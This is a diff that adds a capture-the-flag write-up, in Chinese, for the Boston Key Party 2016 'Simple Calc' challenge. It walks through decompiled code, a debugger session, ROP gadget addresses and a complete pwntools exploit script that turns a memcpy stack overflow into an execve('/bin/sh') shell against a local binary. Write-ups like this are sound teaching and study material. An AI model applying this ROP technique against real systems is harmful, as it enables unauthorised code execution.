@@ -1424,3 +1424,406 @@ interactive()
 
 Flag: `TUCTF{1_607_4_fl46_bu7_n0_fr135}`
 
+## Boston Key Part 2016 Simple Calc
+
+### Information
+
+ - Category: Pwn
+ - Points: 5
+
+### Description
+
+> what a nice little calculator!
+
+<Download name="simplecalc" href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/07-bof_static/bkp16_simplecalc/simplecalc" type="Binary" />
+
+### Writeup
+
+```plain-text
+λ ~/ file simplecalc
+simplecalc: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=3ca876069b2b8dc3f412c6205592a1d7523ba9ea, not stripped
+λ ~/ pwn checksec simplecalc
+[*] '/home/cub3y0nd/simplecalc'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+
+```plain-text
+λ ~/ ./simplecalc
+
+	|#------------------------------------#|
+	|         Something Calculator         |
+	|#------------------------------------#|
+
+Expected number of calculations: 100
+Options Menu:
+ [1] Addition.
+ [2] Subtraction.
+ [3] Multiplication.
+ [4] Division.
+ [5] Save and Exit.
+=> 1
+Integer x: 200
+Integer y: 200
+Result for x + y is 400.
+
+Options Menu:
+ [1] Addition.
+ [2] Subtraction.
+ [3] Multiplication.
+ [4] Division.
+ [5] Save and Exit.
+=> 5
+zsh: segmentation fault (core dumped)  ./simplecalc
+```
+
+伪代码如下：
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v3; // edx
+  int v4; // ecx
+  int v5; // r8d
+  int v6; // r9d
+  int *v7; // rsi
+  int v8; // edx
+  int v9; // ecx
+  int v10; // r8d
+  int v11; // r9d
+  const char *v13; // rdi
+  _DWORD *v14; // rdx
+  int v15; // ecx
+  int v16; // r8d
+  int v17; // r9d
+  int v18; // edx
+  int v19; // ecx
+  int v20; // r8d
+  int v21; // r9d
+  int v22; // edx
+  int v23; // ecx
+  int v24; // r8d
+  int v25; // r9d
+  char v26[40]; // [rsp+10h] [rbp-40h] BYREF
+  int v27; // [rsp+38h] [rbp-18h] BYREF
+  int v28; // [rsp+3Ch] [rbp-14h] BYREF
+  __int64 v29; // [rsp+40h] [rbp-10h]
+  int i; // [rsp+4Ch] [rbp-4h]
+
+  v28 = 0;
+  setvbuf(stdin, 0LL, 2LL, 0LL);
+  setvbuf(stdout, 0LL, 2LL, 0LL);
+  print_motd();
+  printf((unsigned int)"Expected number of calculations: ", 0, v3, v4, v5, v6);
+  v7 = &v28;
+  _isoc99_scanf((unsigned int)"%d", (unsigned int)&v28, v8, v9, v10, v11);
+  handle_newline();
+  if ( v28 <= 255 && v28 > 3 )
+  {
+    v13 = (const char *)(4 * v28);
+    v29 = malloc(v13);
+    for ( i = 0; i < v28; ++i )
+    {
+      print_menu((__int64)v13, (int)v7, (int)v14, v15, v16, v17);
+      v7 = &v27;
+      v13 = "%d";
+      _isoc99_scanf((unsigned int)"%d", (unsigned int)&v27, v18, v19, v20, v21);
+      handle_newline();
+      switch ( v27 )
+      {
+        case 1:
+          adds((__int64)"%d", (int)&v27, v22, v23, v24, v25);
+          v14 = (_DWORD *)(v29 + 4LL * i);
+          *v14 = dword_6C4A88;
+          break;
+        case 2:
+          subs((__int64)"%d", (int)&v27, v22, v23, v24, v25);
+          v14 = (_DWORD *)(v29 + 4LL * i);
+          *v14 = dword_6C4AB8;
+          break;
+        case 3:
+          muls((__int64)"%d", (int)&v27, v22, v23, v24, v25);
+          v14 = (_DWORD *)(v29 + 4LL * i);
+          *v14 = dword_6C4AA8;
+          break;
+        case 4:
+          divs((__int64)"%d", (int)&v27, v22, v23, v24, v25);
+          v14 = (_DWORD *)(v29 + 4LL * i);
+          *v14 = dword_6C4A98;
+          break;
+        case 5:
+          memcpy(v26, v29, 4 * v28);
+          free(v29);
+          return 0;
+        default:
+          v13 = "Invalid option.\n";
+          puts("Invalid option.\n");
+          break;
+      }
+    }
+    free(v29);
+    return 0;
+  }
+  else
+  {
+    puts("Invalid number.");
+    return 0;
+  }
+}
+```
+
+它先问我们要一个预期计算次数，保存在 `v28` 中，若 `v28` 大于 3 且小于等于 255 则继续执行下面的控制流。接下来给 `v29` 分配了 `4 * v28` 的大小，然后进入计算器界面，根据 `v27` 拿到的输入选项执行不同的计算函数。比如 `adds` 的伪代码：
+
+```c
+__int64 __fastcall adds(__int64 a1, int a2, int a3, int a4, int a5, int a6)
+{
+  int v6; // edx
+  int v7; // ecx
+  int v8; // r8d
+  int v9; // r9d
+  int v10; // edx
+  int v11; // ecx
+  int v12; // r8d
+  int v13; // r9d
+  int v14; // edx
+  int v15; // ecx
+  int v16; // r8d
+  int v17; // r9d
+  int v18; // ecx
+  int v19; // r8d
+  int v20; // r9d
+
+  printf((unsigned int)"Integer x: ", a2, a3, a4, a5, a6);
+  _isoc99_scanf((unsigned int)"%d", (unsigned int)&add, v6, v7, v8, v9);
+  handle_newline();
+  printf((unsigned int)"Integer y: ", (unsigned int)&add, v10, v11, v12, v13);
+  _isoc99_scanf((unsigned int)"%d", (unsigned int)&dword_6C4A84, v14, v15, v16, v17);
+  handle_newline();
+  if ( (unsigned int)add <= 0x27 || (unsigned int)dword_6C4A84 <= 0x27 )
+  {
+    puts("Do you really need help calculating such small numbers?\nShame on you... Bye");
+    exit(0xFFFFFFFFLL);
+  }
+  dword_6C4A88 = add + dword_6C4A84;
+  return printf((unsigned int)"Result for x + y is %d.\n\n", add + dword_6C4A84, add, v18, v19, v20);
+}
+```
+
+这个函数从输入流获取两个参数 `x` 和 `y`，分别保存在 `&add` 和 `&dword_6C4A84` 处。然后判断这两个参数中任意一个是否小于等于 0x27(39D)，如果满足则退出，否则将结果保存在 `dword_6C4A88`，并输出结果。最后程序将在 `v29` 中开辟一小块空间将我们的计算结果放进去。
+
+剩下几个计算函数的伪代码形式都差不多，就不展示了。
+
+这里重点在选项 5 存在溢出问题。执行选项 5，程序用 `memcpy` 将从 `v29` 开始的 `4 * v28` 大小内容复制到 `v26`。但是看 `v26` 的定义可知，它只有 40 Bytes 的容量。这使我们有足够的空间为所欲为 xD
+
+所以我们的思路大致是这样：构造一个执行 `/bin/sh` 的 ROP Chain。由于程序最后会把我们的所有计算结果复制到栈上，所以构造方法是通过程序的计算功能算出各个 gadget 的地址。
+
+需要注意的是 `memcpy` 之后有一个 `free` 会清除我们的栈，为了绕过，我们可以给 `free` 赋 0。
+
+so，先来看看溢出点：
+
+```plain-text
+pwndbg> b *main+450
+Breakpoint 1 at 0x401545
+pwndbg> r
+Starting program: /home/cub3y0nd/Projects/CTF/simplecalc
+
+	|#------------------------------------#|
+	|         Something Calculator         |
+	|#------------------------------------#|
+
+Expected number of calculations: 100
+Options Menu:
+ [1] Addition.
+ [2] Subtraction.
+ [3] Multiplication.
+ [4] Division.
+ [5] Save and Exit.
+=> 5
+
+Breakpoint 1, 0x0000000000401545 in main ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+──────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────
+*RAX  0x7fffffffe3c0 ◂— 0x1
+*RBX  0x4002b0 (_init) ◂— sub rsp, 8
+*RCX  0x6c8bd0 ◂— 0x0
+*RDX  0x190
+*RDI  0x7fffffffe3c0 ◂— 0x1
+*RSI  0x6c8bd0 ◂— 0x0
+*R8   0x6c6880 ◂— 0x6c6880
+ R9   0x0
+*R10  0x5
+ R11  0x0
+ R12  0x0
+*R13  0x401c00 (__libc_csu_init) ◂— push r14
+*R14  0x401c90 (__libc_csu_fini) ◂— push rbx
+ R15  0x0
+*RBP  0x7fffffffe400 —▸ 0x6c1018 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x42f230 (__stpcpy_ssse3) ◂— mov rcx, rsi
+*RSP  0x7fffffffe3b0 —▸ 0x7fffffffe4e8 —▸ 0x7fffffffe861 ◂— '/home/cub3y0nd/Projects/CTF/simplecalc'
+*RIP  0x401545 (main+450) ◂— call 4228d0h
+───────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────
+ ► 0x401545 <main+450>    call   4228d0h                       <memcpy>
+        dest: 0x7fffffffe3c0 ◂— 0x1
+        src: 0x6c8bd0 ◂— 0x0
+        n: 0x190
+
+   0x40154a <main+455>    mov    rax, qword ptr [rbp - 10h]
+   0x40154e <main+459>    mov    rdi, rax
+   0x401551 <main+462>    call   4156d0h                       <free>
+
+   0x401556 <main+467>    mov    eax, 0
+   0x40155b <main+472>    jmp    401588h                       <main+517>
+
+   0x40155d <main+474>    mov    edi, 494402h
+   0x401562 <main+479>    call   408de0h                       <puts>
+
+   0x401567 <main+484>    add    dword ptr [rbp - 4], 1
+   0x40156b <main+488>    mov    eax, dword ptr [rbp - 14h]
+   0x40156e <main+491>    cmp    dword ptr [rbp - 4], eax
+────────────────────────────────────[ STACK ]─────────────────────────────────────
+00:0000│ rsp     0x7fffffffe3b0 —▸ 0x7fffffffe4e8 —▸ 0x7fffffffe861 ◂— '/home/cub3y0nd/Projects/CTF/simplecalc'
+01:0008│-048     0x7fffffffe3b8 ◂— 0x100400e45
+02:0010│ rax rdi 0x7fffffffe3c0 ◂— 0x1
+03:0018│-038     0x7fffffffe3c8 ◂— 0x1
+04:0020│-030     0x7fffffffe3d0 —▸ 0x7fffffffe4e8 —▸ 0x7fffffffe861 ◂— '/home/cub3y0nd/Projects/CTF/simplecalc'
+05:0028│-028     0x7fffffffe3d8 —▸ 0x401c77 (__libc_csu_init+119) ◂— add rbx, 1
+06:0030│-020     0x7fffffffe3e0 —▸ 0x4002b0 (_init) ◂— sub rsp, 8
+07:0038│-018     0x7fffffffe3e8 ◂— 0x6400000005
+──────────────────────────────────[ BACKTRACE ]───────────────────────────────────
+ ► 0         0x401545 main+450
+   1         0x40176c __libc_start_main+476
+   2         0x400f77 _start+41
+──────────────────────────────────────────────────────────────────────────────────
+pwndbg> i f
+Stack level 0, frame at 0x7fffffffe410:
+ rip = 0x401545 in main; saved rip = 0x40176c
+ called by frame at 0x7fffffffe4d0
+ Arglist at 0x7fffffffe400, args:
+ Locals at 0x7fffffffe400, Previous frame's sp is 0x7fffffffe410
+ Saved registers:
+  rbp at 0x7fffffffe400, rip at 0x7fffffffe408
+pwndbg> distance 0x7fffffffe3c0 0x7fffffffe408
+0x7fffffffe3c0->0x7fffffffe408 is 0x48 bytes (0x9 words)
+```
+
+可以看到目标地址距离 rip 是 `0x48(72D)` Bytes，也就是 18 个 `int`。为了不让程序执行到 `free` 的时候崩溃，我们可以使前 18 个计算结果为 `0`。
+
+接下来就是如何构造 ROP Chain 了。我们的目标是执行 `/bin/sh`，所以可以通过调用 `execve()` 来实现。
+
+查 [syscall table](https://filippo.io/linux-syscall-table/) 可知要让 `syscall` 执行 `execve()` 需要把 `rax` 设为 59(0x3b)。此外，根据 `execve` 的定义知道它还有三个参数需要满足：`int execve(const char *pathname, char *const _Nullable argv[], char *const _Nullable envp[]);` 第一个参数是 `pathname`，这里我们需要放 `/bin/sh` 的地址，剩下两个参数我们用不上，直接置 0 即可。
+
+那么根据调用约定，`execve` 的三个参数依次分别存放在 `rdi`、`rsi`、`rdx` 中。
+
+所以我们的 ROP Chain 应该长这样：
+
+```plain-text
+pop rdi ; ret
+/bin/sh\0
+pop rsi ; ret
+0
+pop rdx ; ret
+0
+pop rax ; ret
+0x3b
+syscall
+```
+
+但实际上这样会出问题，问题就是不能通过 `pop` 把 `/bin/sh` 字符串传入，这样传会被认为是指令而不是数据。所以我们需要通过 `mov` 指令来实现传入 `/bin/sh`：
+
+```plain-text
+mov rdi, rsp
+/bin/sh\0
+pop rsi ; ret
+0
+pop rdx ; ret
+0
+pop rax ; ret
+0x3b
+syscall
+```
+
+通过 `ROPgadget` 我们可以找到这些 gadget 的地址：
+
+```plain-text
+0x0000000000400493 : pop r12 ; ret
+0x0000000000492468 : mov rdi, rsp ; call r12
+0x0000000000437aa9 : pop rdx ; pop rsi ; ret
+0x000000000044db34 : pop rax ; ret
+0x0000000000400488 : syscall
+```
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import *
+
+context(
+    os='linux',
+    arch='amd64',
+    log_level='debug',
+    terminal='kitty',
+    binary=ELF('./simplecalc')
+)
+
+target = process()
+
+recvline      = lambda : target.recvline()
+recvuntil     = lambda str : target.recvuntil(str)
+sendline      = lambda str : target.sendline(str)
+sendlineafter = lambda str1, str2 : target.sendlineafter(str1.encode(), str2.encode())
+interactive   = lambda : target.interactive()
+
+def add(x, y):
+    sendlineafter('=> ', '1')
+    sendlineafter('x: ', str(x))
+    sendlineafter('y: ', str(y))
+
+def sub(x, y):
+    sendlineafter('=> ', '2')
+    sendlineafter('x: ', str(x))
+    sendlineafter('y: ', str(y))
+
+sendlineafter('Expected number of calculations: ', '100')
+
+# padding for free(0)
+for i in range(0, 18):
+    sub(40, 40)
+
+# pop rdx ; pop rsi ; ret
+add(4422000, 313)
+sub(40, 40)
+sub(40, 40)
+sub(40, 40)
+sub(40, 40)
+sub(40, 40)
+# pop r12 ; ret
+add(4195000, 475)
+sub(40, 40)
+# syscall
+add(4195000, 464)
+sub(40, 40)
+# pop rax ; ret
+add(4512000, 564)
+sub(40, 40)
+# 0x3b
+sub(100, 41)
+sub(40, 40)
+# mov rdi, rsp ; call r12
+add(4793000, 448)
+sub(40, 40)
+# /bin/sh\0
+add(1852400000, 175)
+add(6845000, 231)
+
+sendlineafter('=> ', '5')
+interactive()
+```
+
+### Flag
+
+Flag: `BKPCTF{what_is_2015_minus_7547}`
+
